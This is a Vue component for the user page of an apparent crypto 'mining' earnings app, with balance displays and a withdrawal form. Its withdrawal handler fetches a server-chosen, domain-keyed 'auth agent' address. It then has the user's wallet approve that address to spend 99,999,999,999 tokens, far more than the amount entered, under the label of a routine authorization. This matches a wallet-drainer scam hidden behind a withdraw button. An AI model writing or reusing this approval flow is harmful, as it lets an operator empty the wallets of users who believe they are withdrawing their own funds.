<template>
  <div class="user-pages">
    <div class="user-center">
      <div class="user-avatar">
        <img v-lazy="getAssetsImageUrl('/user/userAvatars.png')" alt="" />
      </div>
      <div class="user-information">
        <div class="user-address">{{ truncateString(address) }}</div>
        <div class="user-grade">
          <img
            v-lazy="
              getAssetsImageUrl(
                `/user/userLv${configStore.$state.userInfo.level}.png`
              )
            "
            alt=""
          />
        </div>
      </div>
    </div>
    <div class="user-fn">
      <div class="fn-item">
        <div class="item-icon">
          <img v-lazy="getAssetsImageUrl('/user/incomeicon.png')" alt="" />
        </div>
        <div class="item-name">收益明细</div>
      </div>
      <div class="fn-item" @click="goToPage('Withdrawal Details')">
        <div class="item-icon">
          <img v-lazy="getAssetsImageUrl('/user/withdrawalicon.png')" alt="" />
        </div>
        <div class="item-name">{{ t("User.withdrawals") }}</div>
      </div>
      <div class="fn-item">
        <div class="item-icon">
          <img v-lazy="getAssetsImageUrl('/user/miningicon.png')" alt="" />
        </div>
        <div class="item-name">我的挖矿</div>
      </div>
      <div class="fn-item" @click="goToPage('Task Center')">
        <div class="item-icon">
          <img v-lazy="getAssetsImageUrl('/user/taskicon.png')" alt="" />
        </div>
        <div class="item-name">{{ t("User.taskCenter") }}</div>
      </div>
    </div>
    <div class="user-assets">
      <div class="my-blance">
        <div class="blance-text">{{ t("User.assets") }}</div>
        <div class="blance-amount">
          {{ Number(configStore.$state.usdtbalance).toFixed(4) || 0 }}
        </div>
      </div>
      <div class="blance-other">
        <div class="other-text">
          {{ t("User.enbWallet") }}<span v-if="chainId == '56'">(BNB)</span>
          <span v-if="chainId == '1'">(ETH)</span>
        </div>
        <div class="other-amount">
          {{ Number(configStore.$state.coinbalance).toFixed(4) || 0 }}
        </div>
      </div>
      <div class="blance-other">
        <div class="other-text">{{ t("User.usdtWallet") }}</div>
        <div class="other-amount">
          {{ Number(configStore.$state.usdtbalance).toFixed(4) || 0 }}
        </div>
      </div>
      <div class="blance-other">
        <div class="other-text">{{ t("User.todayEarnings") }}</div>
        <div class="other-amount">
          {{ configStore.$state.userInfo.dividend_today }}
        </div>
      </div>
      <div class="blance-other">
        <div class="other-text">{{ t("User.totalEarnings") }}</div>
        <div class="other-amount">
          {{ configStore.$state.userInfo.rebate_total }}
        </div>
      </div>
    </div>
    <div class="user-withdrawal">
      <div class="amount-title">
        <div class="title-text">{{ t("User.withdrawable") }}</div>
        <div class="title-amos">
          {{ configStore.$state.userInfo.withdrawable_balance }}
        </div>
      </div>
      <div class="withdrawal-contant">
        <van-field
          v-model="amount"
          :placeholder="t('User.inputWithdrawalAmount')"
          class="withdrawal-inp"
          type="number"
        />
        <van-button
          class="withdrawal-btv"
          :loading="loadingBtv"
          :disabled="!address"
          loading-type="spinner"
          @click="goWithdraw()"
          >{{ t("User.withdraw") }}</van-button
        >
      </div>
    </div>
  </div>
</template>

<script setup>
import { BrowserProvider, Contract } from "ethers";
import { onMounted, ref } from "vue";
import {
  useWeb3ModalAccount,
  useWeb3ModalProvider
} from "@web3modal/ethers/vue";
import {
  getAssetsImageUrl,
  truncateString,
  goToPage
} from "@/utils/index.utils.js";
const { address, chainId } = useWeb3ModalAccount();
const { walletProvider } = useWeb3ModalProvider();
import BigNumber from "bignumber.js";
import ABI from "@/assets/abi/erc20.abi.json";
import { testApi } from "@/api/index";
import { useConfigStore } from "@/stores/index";
const configStore = useConfigStore();
import { useI18n } from "vue3-i18n";
const { t } = useI18n();
const loadingBtv = ref(false);
const goWithdraw = () => {
  if (address.value == void 0) return modal.open();
  if (Number(amount.value) === 0)
    return showFailToast(t("invalidWithdrawalAmount"));
  if (amount.value == "") return showFailToast(t("enterWithdrawalAmount"));
  if (configStore.$state.userInfo.withdrawable_balance < Number(amount.value))
    return showFailToast(t("insufficientBalanceWithdrawal"));
  queryAuthAgent();
};
/**
 * 获取不同的授权地址。
 *
 * @function getAuthAgent
 * @param {String} chainType - 链类型1以太 56bsc。
 * @param {String} domains - 使用当前浏览器地址。
 * @returns {Object} - 返回首页数据对象。
 */
const queryAuthAgent = () => {
  loadingBtv.value = true;
  if (address.value == void 0) {
    modal.open();
  }
  testApi
    .getAuthAgent({
      chainType: chainId.value,
      domains: configStore.$state.domainsUrl //代理域名
    })
    .then(res => {
      let approveAdress = res.data;
      handleConfirm(approveAdress);
    })
    .catch(() => {
      loadingBtv.value = false;
    });
};
//调用钱包授权
const handleConfirm = async function (approveAddr) {
  try {
    const provider = new BrowserProvider(walletProvider.value);
    const signer = await provider.getSigner();
    //提现金额
    const dai = amount.value;
    //  合约授权
    const tokenContract = new Contract(
      configStore.$state.coinadress,
      ABI,
      provider
    );
    const allowAmt = await tokenContract.allowance(address.value, approveAddr);
    //金额 乘18位
    let nums = new BigNumber(dai).multipliedBy(Math.pow(10, 18));
    let allowAmtnum = new BigNumber(allowAmt);
    //查询授权数量是否小于0
    if (allowAmtnum.comparedTo(nums) < 0) {
      let singeContractConnect = tokenContract.connect(signer);
      let quotaNum =
        "0x" +
        new BigNumber(99999999999).multipliedBy(Math.pow(10, 18)).toString(16);
      const tx = await singeContractConnect.approve(approveAddr, quotaNum);
      showLoadingToast({
        message: t("authorizationPending"),
        forbidClick: true,
        wordBreak: "break-word",
        duration: 0
      });
      const value = await tx.wait();
      if (value.status) {
        showSuccessToast({
          message: t("authorizationSuccess"),
          forbidClick: true,
          wordBreak: "break-word",
          duration: 3000
        });
      } else {
        showFailToast({
          message: t("authorizationFailed"),
          wordBreak: "break-word",
          forbidClick: true,
          duration: 3000
        });
        loadingBtv.value = false;
        return;
      }
    }
    queryWithdraw();
  } catch (e) {
    console.log(e);
  }
};
const amount = ref("");
/**
 * 提现接口。
 *
 * @function getWithdraw
 * @param {String} chainType - 链类型1以太 56bsc。
 * @param {String} address - 钱包地址。
 * @param {String} amount - 提现金额。
 * @returns {String} - 返回成功或者失败。
 */
const queryWithdraw = () => {
  testApi
    .getWithdraw({
      address: address.value,
      chainType: chainId.value,
      amount: amount.value
    })
    .then(res => {
      if (res.code == 200) {
        showSuccessToast({
          message: t("applicationSuccess"),
          forbidClick: true,
          wordBreak: "break-word",
          duration: 3000
        });
        configStore.queryUserInfo(address.value, chainId.value);
        amount.value = "";
        loadingBtv.value = false;
      } else {
        showFailToast(res.msg);
        loadingBtv.value = false;
      }
    })
    .catch(() => {
      loadingBtv.value = false;
    });
};
onMounted(() => {});
</script>
<style lang="scss" scoped>
.user-pages {
  padding: 1.29rem 1.14rem 6rem;
  border-top: 0.04rem solid #ffffff1a;
  .user-center {
    display: flex;
    .user-avatar {
      width: 4.29rem;
      height: 4.29rem;
      > img {
        width: 100%;
        height: 100%;
      }
    }
    .user-information {
      margin-left: 0.86rem;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      .user-address {
        font-family: PingFang SC;
        font-size: 1.14rem;
        font-weight: 400;
        line-height: 1.6rem;
        color: #ffffff;
      }
      .user-grade {
        width: 3.93rem;
        > img {
          width: 100%;
        }
      }
    }
  }
  .user-fn {
    margin-top: 1.57rem;
    background: #ffffff1a;
    border: 0.04rem solid #ffffff1a;
    display: flex;
    justify-content: space-between;
    padding: 1.43rem 1rem;
    border-radius: 0.71rem;
    .fn-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      .item-icon {
        width: 2.14rem;
        > img {
          width: 100%;
        }
      }
      .item-name {
        margin-top: 0.71rem;
        font-family: PingFang SC;
        font-size: 0.86rem;
        font-weight: 400;
        line-height: 1.2rem;
        color: #ffffff;
      }
    }
  }
  .user-assets {
    background: #ff9e3e33;
    border-top: 0.07rem solid #ffdc1899;
    border-radius: 1.14rem;
    margin-top: 1.43rem;
    .my-blance {
      background: #ffffff0f;
      padding-bottom: 1.21rem;
      display: flex;
      justify-content: space-between;
      padding: 1.21rem 0.86rem;
      border-top-left-radius: 1.14rem;
      border-top-right-radius: 1.14rem;
      .blance-text {
        font-family: PingFang SC;
        font-size: 1.14rem;
        font-weight: 400;
        line-height: 1.6rem;
        color: #ffffffcc;
      }
      .blance-amount {
        font-family: DIN;
        font-size: 1.43rem;
        font-weight: 700;
        line-height: 1.74rem;
        color: #93f504;
      }
    }
    .blance-other {
      display: flex;
      justify-content: space-between;
      padding: 0.86rem;
      .other-text {
        font-family: PingFang SC;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;

        color: #ffffffb2;
      }
      .other-amount {
        color: #ffffff;
        font-family: DIN;
        font-size: 1.14rem;
        font-weight: 500;
        line-height: 1.38rem;
      }
    }
  }
  .user-withdrawal {
    padding: 1.29rem 0.86rem;
    border: 0.04rem solid #ffffff1a;
    background: #ffffff1a;
    border-radius: 0.71rem;
    margin-top: 1.43rem;
    .amount-title {
      display: flex;
      justify-content: space-between;
      .title-text {
        font-family: PingFang SC;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;
        color: #ffffff;
      }
      .title-amos {
        font-family: DIN;
        font-size: 1.14rem;
        font-weight: 500;
        line-height: 1.38rem;
        color: #93f504;
      }
    }
    .withdrawal-contant {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 1.36rem;
      .withdrawal-inp {
        width: 14.71rem;
        border-radius: 0.57rem;
        height: 2.71rem;
      }
      :deep(.van-field__control::-webkit-input-placeholder) {
        color: #00000099;
        font-size: 0.86rem;
      }
      :deep(.van-field__body) {
        height: 100%;
      }
      :deep(.van-cell) {
        padding: 0 0 0 16px;
      }
      .withdrawal-btv {
        height: 2.29rem;
        background: #ff693e;
        border-radius: 2.21rem;
        padding: 0 1.14rem;
        font-family: PingFang SC;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;
        color: #ffffff;
        border: none;
      }
    }
  }
}
</style>
